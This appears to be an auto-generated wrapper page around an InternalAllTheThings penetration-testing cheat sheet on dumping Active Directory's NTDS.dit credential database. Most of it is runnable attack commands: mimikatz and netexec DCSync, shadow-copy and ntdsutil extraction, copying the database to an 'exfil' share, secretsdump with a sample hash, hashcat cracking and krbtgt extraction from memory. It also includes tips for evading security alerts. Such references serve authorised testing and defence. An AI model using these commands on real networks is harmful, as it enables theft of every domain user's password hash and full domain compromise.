---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - NTDS Dumping

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adds-ntds-dumping` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-ntds-dumping.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - NTDS Dumping](../../topics/active-directory/active-directory-ntds-dumping.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adds-ntds-dumping |
| name | Active Directory - NTDS Dumping |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adds-ntds-dumping.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - NTDS Dumping\n\nYou will need the following files to extract the ntds :\n\n- NTDS.dit file\n\
  - SYSTEM hive (`C:\\Windows\\System32\\SYSTEM`)\n\nUsually you can find the ntds in two locations : `systemroot\\NTDS\\\
  ntds.dit` and `systemroot\\System32\\ntds.dit`.\n\n- `systemroot\\NTDS\\ntds.dit` stores the database that is in use on\
  \ a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration\
  \ container data).\n- `systemroot\\System32\\ntds.dit` is the distribution copy of the default directory that is used when\
  \ you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this\
  \ file is available, you can run the Active Directory Installation Wizard without having to use the server operating system\
  \ CD.\n\nHowever you can change the location to a custom one, you will need to query the registry to get the current location.\n\
  \n```powershell\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \"DSA Database file\"\n```\n\n\
  ## DCSync Attack\n\nDCSync is a technique used by attackers to obtain sensitive information, including password hashes,\
  \ from a domain controller in an Active Directory environment. Any member of Administrators, Domain Admins, or Enterprise\
  \ Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.\n\n- DCSync only one\
  \ user\n\n  ```powershell\n  mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt\n  ```\n\n- DCSync all users of the\
  \ domain\n\n  ```powershell\n  mimikatz# lsadump::dcsync /domain:htb.local /all /csv\n\n  netexec smb 10.10.10.10 -u 'username'\
  \ -p 'password' --ntds\n  netexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi\n  ```\n\n> :warning: OPSEC\
  \ NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.\n\n## Volume\
  \ Shadow Copy\n\nThe VSS is a Windows service that allows users to create snapshots or backups of their data at a specific\
  \ point in time. Attackers can abuse this service to access and copy sensitive data, even if it is currently being used\
  \ or locked by another process.\n\n- [windows-commands/vssadmin](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin)\n\
  \n  ```powershell\n  vssadmin create shadow /for=C:\n  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\\
  NTDS\\NTDS.dit C:\\ShadowCopy\n  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\\
  SYSTEM C:\\ShadowCopy\n  ```\n\n- [windows-commands/ntdsutil](https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/use-ntdsutil-manage-ad-files)\n\
  \n  ```powershell\n  ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q\n  ```\n\n- [Pennyw0rth/NetExec](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit)\
  \ - VSS module\n\n  ```powershell\n  nxc smb 10.10.0.202 -u username -p password --ntds vss\n  ```\n\nAlternate way to access\
  \ a VSS snapshot in GUI:\n\n- Select a snapshot, go to \"Previous Versions\" tab\n- See the properties and recover the path\
  \ in this format `@GMT-yyyy.MM.dd-HH.mm.ss`\n\n  ```ps1\n  Y:\\@GMT-2025.07.10-13.05.00\n  ```\n\n## Forensic Tools\n\n\
  A good method for avoiding or reducing detections involves using common forensic tools to dump the NTDS.dit file and the\
  \ SYSTEM hive. By utilizing widely recognized and legitimate forensic software, the process can be conducted more discreetly\
  \ and with a lower risk of triggering security alerts.\n\n- Dump the memory with [magnet/dumpit](https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/)\n\
  - Use volatility to extract the `SYSTEM` hive\n\n  ```ps1\n  volatility -f test.raw windows.registry.printkey.PrintKey\n\
  \  volatility --profile=Win10x64_14393 dumpregistry -o 0xaf0287e41000 -D output_vol -f test.raw\n  ```\n\n- Use [exterro/ftk-imager](https://www.exterro.com/digital-forensics-software/ftk-imager)\
  \ to read the disk in raw state\n    - Go to `File` -> `Add Evidence Item` -> `Physical Drive` -> `Select the C drive`.\n\
  \    - Export `C:\\Windows\\NTDS\\ntds.dit`.\n- Finally use secretdump: `secretsdump.py LOCAL -system output_vol/registry.0xaf0287e41000.SYSTEM.reg\
  \ -ntds ntds.dit`\n\n## Extract hashes from ntds.dit\n\nThen you need to use [impacket/secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\
  \ to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit\n\n```java\nsecretsdump.py -system /root/SYSTEM\
  \ -ntds /root/ntds.dit LOCAL\n```\n\n[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\
  \ also works remotely\n\n```java\n./secretsdump.py -dc-ip IP AD\\administrator@domain -use-vss -pwd-last-set -user-status\
  \ \n./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\\
  $@10.0.0.1\n```\n\n- `-pwd-last-set`: Shows pwdLastSet attribute for each NTDS.DIT account.\n- `-user-status`: Display whether\
  \ or not the user is disabled.\n\n## Extract hashes from adamntds.dit\n\nIn AD LDS stores the data inside a dit file located\
  \ at `C:\\Program Files\\Microsoft ADAM\\instance1\\data\\adamntds.dit`.\n\n- Dump adamntds.dit with Shadow copy using `vssadmin.exe`\n\
  \n    ```ps1\n    vssadmin.exe create shadow /For=C:\n    cp \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Program\
  \ files\\Microsoft ADAM\\instance1\\data\\adamntds.dit\" \\\\exfil\\data\\adamntds.dit\n    ```\n\n- Dump adamntds.dit with\
  \ Windows Server Backup using `wbadmin.exe`\n\n    ```ps1\n    wbadmin.exe start backup -backupTarget:e: -vssCopy -include:\"\
  C:\\Program Files\\Microsoft ADAM\\instance1\\data\\adamntds.dit\"\n    wbadmin.exe start recovery -version:08/04/2023-12:59\
  \ -items:\"c:\\Program Files\\Microsoft ADAM\\instance1\\data\\adamntds.dit\" -itemType:File -recoveryTarget:C:\\Users\\\
  Administrator\\Desktop\\ -backupTarget:e:\n    ```\n\n- Extract hashes with [synacktiv/ntdissector](https://github.com/synacktiv/ntdissector)\n\
  \n    ```ps1\n    ntdissector path/to/adamntds.dit\n    python ntdissector/tools/user_to_secretsdump.py path/to/output/*.json\n\
  \    ```\n\n## Crack NTLM hashes with hashcat\n\nUseful when you want to have the clear text password or when you need to\
  \ make stats about weak passwords.\n\nRecommended wordlists:\n\n- [Rockyou.txt](https://weakpass.com/wordlist/90)\n- [Have\
  \ I Been Pwned founds](https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20(NTLM))\n- [Weakpass.com](https://weakpass.com/)\n\
  - Read More at [Methodology and Resources/Hash Cracking.md](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/)\n\
  \n```powershell\n# Basic wordlist\n# (-O) will Optimize for 32 characters or less passwords\n# (-w 4) will set the workload\
  \ to \"Insane\" \n$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types\
  \ 1,2\n\n# Generate a custom mask based on a wordlist\n$ git clone https://github.com/iphelix/pack/blob/master/README\n\
  $ python2 statsgen.py ../hashcat.potfile -o hashcat.mask\n$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex\
  \ -q -o hashcat_1H.hcmask\n```\n\n:warning: If the password is not a confidential data (challenges/ctf), you can use online\
  \ \"cracker\" like :\n\n- [hashmob.net](https://hashmob.net)\n- [crackstation.net](https://crackstation.net)\n- [hashes.com](https://hashes.com/en/decrypt/hash)\n\
  \n## NTDS Reversible Encryption\n\n`UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED` ([0x00000080](http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm)),\
  \ if this bit is set, the password for this user stored encrypted in the directory - but in a reversible form.\n\nThe key\
  \ used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin.\n\
  This means the hashes can be trivially reversed to the cleartext values, hence the term “reversible encryption”.\n\n- List\
  \ users with \"Store passwords using reversible encryption\" enabled\n\n    ```powershell\n    Get-ADUser -Filter 'userAccountControl\
  \ -band 128' -Properties userAccountControl\n    ```\n\nThe password retrieval is already handled by [SecureAuthCorp/secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\
  \ and mimikatz, it will be displayed as CLEARTEXT.\n\n## Extract hashes from memory\n\nDumps credential data in an Active\
  \ Directory domain when run on a Domain Controller.\n\n:warning: Requires administrator access with debug privilege or NT-AUTHORITY\\\
  SYSTEM account.\n\n```powershell\nmimikatz> privilege::debug\nmimikatz> sekurlsa::krbtgt\nmimikatz> lsadump::lsa /inject\
  \ /name:krbtgt\n```\n\n## References\n\n- [Bypassing EDR NTDS.dit protection using BlueTeam tools - bilal al-qurneh - June\
  \ 9, 2024](https://medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools-1d161a554f9f)\n- [Diskshadow\
  \ The Return Of VSS Evasion Persistence And AD Db Extraction - bohops - March 26, 2018](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)\n\
  - [Dumping Domain Password Hashes - Pentestlab - July 4, 2018](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)\n\
  - [Using Ntdissector To Extract Secrets From Adam Ntds Files - Julien Legras, Mehdi Elyassa - December 06, 2023](https://www.synacktiv.com/publications/using-ntdissector-to-extract-secrets-from-adam-ntds-files)"
_relative_path: active-directory/ad-adds-ntds-dumping.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adds-ntds-dumping.md
````
